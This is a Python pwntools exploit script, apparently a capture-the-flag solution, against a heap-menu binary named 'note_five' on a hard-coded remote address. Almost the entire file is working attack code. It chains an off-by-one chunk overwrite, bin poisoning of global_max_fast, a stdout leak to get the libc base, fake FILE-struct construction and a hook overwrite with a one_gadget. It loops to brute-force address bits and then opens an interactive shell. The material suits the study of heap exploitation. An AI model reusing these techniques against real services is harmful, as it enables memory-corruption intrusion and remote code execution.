from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
         p32(0) + \
         p64(_IO_read_ptr) + \
         p64(_IO_read_end) + \
         p64(_IO_read_base) + \
         p64(_IO_write_base) + \
         p64(_IO_write_ptr) + \
         p64(_IO_write_end) + \
         p64(_IO_buf_base) + \
         p64(_IO_buf_end) + \
         p64(_IO_save_base) + \
         p64(_IO_backup_base) + \
         p64(_IO_save_end) + \
         p64(_IO_marker) + \
         p64(_IO_chain) + \
         p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct

def add(idx, size):
	p.recvuntil('>>')
	p.sendline('1')
	p.recvuntil('idx')
	p.sendline(str(idx))
	p.recvuntil('size')
	p.sendline(str(size))

def edit(idx, content):
	p.recvuntil('>>')
	p.sendline('2')
	p.recvuntil('idx')
	p.sendline(str(idx))
	p.recvuntil('content')
	p.sendline(content)

def free(idx):
	p.recvuntil('>>')
	p.sendline('3')
	p.recvuntil('idx')
	p.sendline(str(idx))

while(1):
	debug = 0
	if debug == 1:
		p = process('./note_five')
	else:
		p = remote('112.126.103.195', 9999)
	try:
		# add(0, 0x400)
		# add(0, 0x400)
		# add(0, 0x400)
		add(0, 0x98)
		add(1, 0x90)
		add(2, 0xe0)
		edit(2, p64(0) * 9 + p64(0xa1))
		add(3, 0xe0)
		add(4, 0x400)
		edit(4, p64(0x41) * 0x80)
		edit(0, 'A' * 0x98 + '\xf1')
		free(1)
		add(1, 0xe0)
		free(2)
		edit(1, p64(0) * 19 + p64(0xf1) + p64(0) + '\xe8\x37')
		'''
		0x7ffff7dd25cf stdout
		0x7ffff7dd37e8 global_max_fast-0x10
		'''
		add(2, 0xe0)
		#gdb.attach(p)
		#free(0)
		free(2)
		free(3)
		free(1)

		#gdb.attach(p)

		#add(0, 0x98)
		add(1, 0xe0)
		edit(1, p64(0) * 19 + p64(0xf1) +'\xcf\x25')
		add(3, 0xe0)
		add(2, 0xe0)
		add(0, 0xe0)
		edit(0, '\x00' + p64(0) * 8 + p64(0xfbad1800) + p64(0) * 3 + '\x00')
		libc_base = u64(p.recvline()[-50: -43].ljust(8, '\x00')) - 0x3c48e0
		print hex(libc_base)
		system = libc_base + 0x45390
		free_hook = libc_base + 0x3c67a8
		one_gadget = libc_base + 0xf1147 #0xf02a4
		realloc = libc_base + 0x846c0

		io_list_all_addr = libc_base + 0x3c5520
		jump_table_addr = libc_base + 0x3c36e0 + 0xc0
		binsh_addr=libc_base + 0x18cd57
		file_struct = pack_file(_flags = 0,
                        _IO_read_ptr = 0x61, 
                        _IO_read_base = io_list_all_addr-0x10, 
                        _IO_write_base = 0,
                        _IO_write_ptr = 1,
                        _IO_buf_base = binsh_addr,
                        _mode = 0,
                        ) 
		file_struct += p64(jump_table_addr - 0x8) + p64(0)
		file_struct += p64(system)

		# edit(3, p64(0xf1) * 24)
		# free(3)
		# free(2)
		# free(1)
		# add(1, 0xe0)
		# edit(1, p64(0) * 19 + p64(0xf1) + '\xf0')
		# add(2, 0xe0)
		# add(3, 0xe0)
		# edit(3, p64(0) * 5 + p64(0xce1))
		# gdb.attach(p)












		
		free(2)
		edit(1, p64(0) * 19 + p64(0xf1) + p64(libc_base + 0x3c496f))
		add(2, 0xe0)
		add(4, 0xe0)
		edit(4, '\x00' + p64(0) * 9 + p64(0x311))
		edit(1, p64(0) * 19 + p64(0x311))
		
		#gdb.attach(p)
		free(2)
		edit(1, p64(0) * 19 + p64(0x311) + p64(libc_base + 0x3c49c0))
		#gdb.attach(p)
		add(2, 0x300)
		add(4, 0x300)
		
		#edit(4, p64(0) * 53 + p64(libc_base + 0x3c5c50) + p64(0) * 41 + p64(0x311))
		edit(4, p64(0) * 39 + p64(one_gadget) + p64(realloc+20))
		#gdb.attach(p)
		# for i in range(2):
		# 	free(2)
		# 	edit(1, p64(0) * 19 + p64(0x311) + p64(libc_base + 0x3c49c0 + 0x300 * (i + 1)))
		# 	add(2, 0x300)
		# 	add(4, 0x300)
		# 	edit(4, p64(0) * 95 + p64(0x311) )
		# free(2)
		# edit(1, p64(0) * 19 + p64(0x311) + p64(libc_base + 0x3c49c0 + 0x300 * 3))
		# add(2, 0x300)
		# add(4, 0x300)
		# gdb.attach(p)
		# edit(4, p64(0) * 46 + p64(0) + p64(0x311))
		# free(2)
		# edit(1, p64(0) * 19 + p64(0x311) + p64(libc_base + 0x3c49c0 + 0x300 * 3 + 0x180))
		# add(2, 0x300)
		# add(4, 0x300)
		# #gdb.attach(p)
		# edit(4, p64(0) * 58 + p64(io_list_all_addr + 0x100) + p64(0) * 31 + file_struct)
		# #gdb.attach(p)

	except:
		p.close()
		continue
	else:
		break
#gdb.attach(p)
add(0, 0x200)
p.interactive()
